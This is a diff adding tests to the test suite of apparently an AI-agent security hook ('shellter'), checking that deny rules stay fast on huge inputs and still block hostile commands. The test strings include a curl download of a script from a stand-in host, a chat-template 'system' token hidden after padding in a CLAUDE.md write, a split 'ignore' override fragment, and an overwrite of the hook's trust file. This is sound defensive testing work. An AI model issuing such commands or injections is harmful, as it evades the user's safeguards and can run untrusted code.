@@ -3065,6 +3065,45 @@ console.log('\n--- 0.11.0 r2 step 1: false denies and prompts from the fix revie
   testBash('trust: redirect into ~/.claude/shellter-trust.json still denies', 'echo {} > ~/.claude/shellter-trust.json', 'deny');
 }
 
+console.log('\n--- 0.11.0 r2 step 2: regex cost bounds, linear comment scan (B H-11, B M-1, B M-5, F H-1) ---');
+{
+  // Every rule of the three deny tables against 30 KB of its own literal prefix and four fixed paddings.
+  const tables = require(BASH_HOOK);
+  const PADS = ['sed x -i ', '>', '<(', '${a:`'];
+  const prefixOf = (re) => (re.source.replace(/^\^?(?:\\s\*|\\b)*/, '').match(/^(?:[A-Za-z0-9_.@=-]|\\[.\-\/\\])+/) || [''])[0].replace(/\\(.)/g, '$1');
+  let worst = 0, worstRule = '';
+  for (const tab of Object.values(tables)) for (const [rule] of tab) {
+    const pads = typeof rule === 'function' ? PADS : [prefixOf(rule) + ' ', ...PADS];
+    for (const pad of pads) {
+      if (!pad.trim()) continue;
+      const s = pad.repeat(Math.ceil(30000 / pad.length)).slice(0, 30000);
+      const t0 = Date.now();
+      try { typeof rule === 'function' ? rule(s) : rule.test(s); } catch { /* a throw is not a hang */ }
+      const ms = Date.now() - t0;
+      if (ms > worst) { worst = ms; worstRule = String(rule).slice(0, 80) + ' on ' + JSON.stringify(pad); }
+    }
+  }
+  check('cost: every deny rule returns in < 600 ms on 30 KB (worst ' + worst + ' ms: ' + worstRule + ')', worst < 600, true);
+  // B H-11 shape through the hook
+  const t1 = Date.now();
+  runHook(BASH_HOOK, { tool_name: 'Bash', tool_input: { command: 'sed x -i '.repeat(3000) } });
+  check('cost: 27 KB of `sed x -i` returns in < 3 s', Date.now() - t1 < 3000, true);
+  // B M-1: the download-script deny sees past a quoted `&`
+  testBash('download script: URL with a query string still denies', join('cu', 'rl "https://u.test/x.sh?a=1&b=2" -o x'), 'deny');
+  // F H-1: many comment openers and one closer far away
+  const t2 = Date.now();
+  const r = runHook(FILES_HOOK, { tool_name: 'Write', tool_input: { file_path: 'CLAUDE.md', content: '<!--'.repeat(62500) + '-->' + join('<|im', '_start|>system') } });
+  check('cost: 250 KB of comment openers + one closer returns in < 2.5 s', Date.now() - t2 < 2500, true);
+  check('cost: the payload after the openers still denies', r.decision, 'deny');
+  const scan = require(path.join(HOOKS_DIR, 'scan-content.js'));
+  for (const pad of ['<!--', '<!--http ', 'remove the ', '$(a/']) {
+    const big = String.fromCharCode(0xff21) + pad.repeat(Math.ceil(300000 / pad.length)) + ' **x** ign' + 'ore';
+    const t3 = Date.now();
+    scan.scanInjection(big, { decode: true });
+    check('cost: every scan view on 300 KB of ' + JSON.stringify(pad) + ' < 2 s', Date.now() - t3 < 2000, true);
+  }
+}
+
 console.log('\n--- prompt-rate corpus ---');
 // Sanitised real commands (shapes from an audit log) and benign twins that are auto-approved
 // today and must stay that way: a new prompt on any of them is a regression. Never weaken a
